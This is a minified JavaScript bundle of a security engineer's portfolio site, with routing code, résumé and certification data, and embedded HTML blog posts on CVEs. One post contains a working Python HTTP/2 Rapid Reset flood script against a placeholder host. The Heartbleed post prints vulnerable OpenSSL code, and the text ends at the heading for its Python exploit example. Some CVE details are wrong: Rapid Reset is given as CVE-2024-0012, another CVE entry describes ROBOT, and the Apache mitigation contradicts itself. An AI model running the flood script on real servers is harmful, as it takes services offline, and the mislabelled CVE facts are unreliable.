0&&(t=null),s===void 0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 0:r.errors;if(l!=null){let u=a.findIndex(h=>h.route.id&&(l==null?void 0:l[h.route.id])!==void 0);u>=0||ne(!1),a=a.slice(0,Math.min(a.length,u+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let u=0;u<a.length;u++){let h=a[u];if((h.route.HydrateFallback||h.route.hydrateFallbackElement)&&(c=u),h.route.id){let{loaderData:f,errors:g}=t,k=h.route.loader&&f[h.route.id]===void 0&&(!g||g[h.route.id]===void 0);if(h.route.lazy||k){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((u,h,f)=>{let g,k=!1,y=null,w=null;t&&(g=l&&h.route.id?l[h.route.id]:void 0,y=h.route.errorElement||yg,o&&(c<0&&f===0?(Tg("route-fallback"),k=!0,w=null):c===f&&(k=!0,w=h.route.hydrateFallbackElement||null)));let d=n.concat(a.slice(0,f+1)),p=()=>{let m;return g?m=y:k?m=w:h.route.Component?m=E.createElement(h.route.Component,null):h.route.element?m=h.route.element:m=u,E.createElement(wg,{match:h,routeContext:{outlet:u,matches:d,isDataRoute:t!=null},children:m})};return t&&(h.route.ErrorBoundary||h.route.errorElement||f===0)?E.createElement(vg,{location:t.location,revalidation:t.revalidation,component:y,error:g,children:p(),routeContext:{outlet:null,matches:d,isDataRoute:!0}}):p()},null)}var Od=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Od||{}),Md=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Md||{});function bg(e){let n=E.useContext(uo);return n||ne(!1),n}function xg(e){let n=E.useContext(ug);return n||ne(!1),n}function _g(e){let n=E.useContext(Yn);return n||ne(!1),n}function Id(e){let n=_g(),t=n.matches[n.matches.length-1];return t.route.id||ne(!1),t.route.id}function Sg(){var e;let n=E.useContext(Pd),t=xg(),s=Id();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function Eg(){let{router:e}=bg(Od.UseNavigateStable),n=Id(Md.UseNavigateStable),t=E.useRef(!1);return Nd(()=>{t.current=!0}),E.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,js({fromRouteId:n},i)))},[e,n])}const Dc={};function Tg(e,n,t){Dc[e]||(Dc[e]=!0)}function Cg(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function _n(e){ne(!1)}function Ag(e){let{basename:n="/",children:t=null,location:s,navigationType:r=Ln.Pop,navigator:i,static:a=!1,future:l}=e;qs()&&ne(!1);let o=n.replace(/^\/*/,"/"),c=E.useMemo(()=>({basename:o,navigator:i,static:a,future:js({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=qt(s));let{pathname:u="/",search:h="",hash:f="",state:g=null,key:k="default"}=s,y=E.useMemo(()=>{let w=co(u,o);return w==null?null:{location:{pathname:w,search:h,hash:f,state:g,key:k},navigationType:r}},[o,u,h,f,g,k,r]);return y==null?null:E.createElement(ht.Provider,{value:c},E.createElement(Ai.Provider,{children:t,value:y}))}function Pg(e){let{children:n,location:t}=e;return fg(sl(n),t)}new Promise(()=>{});function sl(e,n){n===void 0&&(n=[]);let t=[];return E.Children.forEach(e,(s,r)=>{if(!E.isValidElement(s))return;let i=[...n,r];if(s.type===E.Fragment){t.push.apply(t,sl(s.props.children,i));return}s.type!==_n&&ne(!1),!s.props.index||!s.props.children||ne(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=sl(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function rl(){return rl=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},rl.apply(this,arguments)}function Ng(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function Lg(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Rg(e,n){return e.button===0&&(!n||n==="_self")&&!Lg(e)}const Og=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Mg="6";try{window.__reactRouterVersion=Mg}catch{}const Ig="startTransition",jc=Sh[Ig];function zg(e){let{basename:n,children:t,future:s,window:r}=e,i=E.useRef();i.current==null&&(i.current=Dm({window:r,v5Compat:!0}));let a=i.current,[l,o]=E.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},u=E.useCallback(h=>{c&&jc?jc(()=>o(h)):o(h)},[o,c]);return E.useLayoutEffect(()=>a.listen(u),[a,u]),E.useEffect(()=>Cg(s),[s]),E.createElement(Ag,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Dg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",jg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ct=E.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:u,viewTransition:h}=n,f=Ng(n,Og),{basename:g}=E.useContext(ht),k,y=!1;if(typeof c=="string"&&jg.test(c)&&(k=c,Dg))try{let m=new URL(window.location.href),v=c.startsWith("//")?new URL(m.protocol+c):new URL(c),x=co(v.pathname,g);v.origin===m.origin&&x!=null?c=x+v.search+v.hash:y=!0}catch{}let w=pg(c,{relative:r}),d=Bg(c,{replace:a,state:l,target:o,preventScrollReset:u,relative:r,viewTransition:h});function p(m){s&&s(m),m.defaultPrevented||d(m)}return E.createElement("a",rl({},f,{href:k||w,onClick:y||i?s:p,ref:t,target:o}))});var Bc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Bc||(Bc={}));var Fc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Fc||(Fc={}));function Bg(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=Ld(),c=Xs(),u=Rd(e,{relative:a});return E.useCallback(h=>{if(Rg(h,t)){h.preventDefault();let f=s!==void 0?s:ii(c)===ii(u);o(e,{replace:f,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,u,s,r,t,e,i,a,l])}function Fg({onToggleTheme:e,theme:n}){const t=Xs(),s=Ld(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(u,h)=>{u.preventDefault();const f=()=>{const g=document.getElementById(h);g&&g.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(f,80)):f()};return b.jsx("nav",{className:"navbar",children:b.jsxs("div",{className:"container nav-container",children:[b.jsx("div",{className:"logo",children:"Hem Parekh | Security Engineer"}),b.jsxs("ul",{className:"nav-links",children:[b.jsx("li",{children:b.jsx("a",{href:"#about",onClick:u=>c(u,"about"),children:"About"})}),b.jsx("li",{children:b.jsx("a",{href:"#experience",onClick:u=>c(u,"experience"),children:"Experience"})}),b.jsx("li",{children:b.jsx(Ct,{to:"/projects",className:i?"active":"",children:"Projects"})}),b.jsx("li",{children:b.jsx(Ct,{to:"/certifications",className:a?"active":"",children:"Certs"})}),b.jsx("li",{children:b.jsx(Ct,{to:"/blogs",className:r?"active":"",children:"Blog"})}),b.jsx("li",{children:b.jsx(Ct,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),b.jsx("li",{children:b.jsx("a",{href:"#contact",className:o?"active":"",onClick:u=>c(u,"contact"),children:"Contact"})})]}),b.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:e,children:["Theme: ",n==="dark"?"Dark":"Light"]})]})})}function Ug(){return b.jsx("footer",{className:"footer",children:b.jsx("div",{className:"container",children:b.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Mt({title:e,id:n,children:t}){return b.jsxs("section",{className:"terminal-section",id:n,children:[b.jsx("div",{className:"terminal-header",children:`> ${e.toUpperCase()}`}),b.jsx("div",{className:"terminal-body",children:t}),b.jsx("div",{className:"terminal-divider",children:"------------------------------------------------------------"})]})}const Hg=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Uc={highlight:"Hem Parekh",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Vg={text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},Wg=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],$g=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],Gg=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],po=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Hc(){return b.jsxs("div",{className:"terminal-feed",children:[b.jsx(Mt,{title:"home",children:b.jsx("pre",{className:"terminal-block",children:`user: ${Uc.highlight}
roles: Security Engineer | Pen Tester | Threat Hunter
bio: ${Uc.blurb}`})}),b.jsx(Mt,{title:"experience",id:"experience",children:b.jsx("ul",{className:"terminal-list",children:Wg.map(e=>b.jsxs("li",{children:[e.role," @ ",e.org," [",e.range,"]"]},`${e.role}-${e.range}`))})}),b.jsxs(Mt,{title:"about",id:"about",children:[b.jsx("p",{className:"terminal-text",children:Vg.text}),b.jsx("div",{className:"terminal-list inline",children:Hg.map(e=>b.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.label},e.href))})]})]})}function Yg(){return b.jsx("div",{className:"terminal-feed",children:b.jsx(Mt,{title:"blogs",children:b.jsx("ul",{className:"terminal-list",children:po.map(e=>b.jsxs("li",{children:[b.jsx(Ct,{to:`/blog/${e.slug}`,children:e.title})," — ",e.excerpt]},e.slug))})})})}const qg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
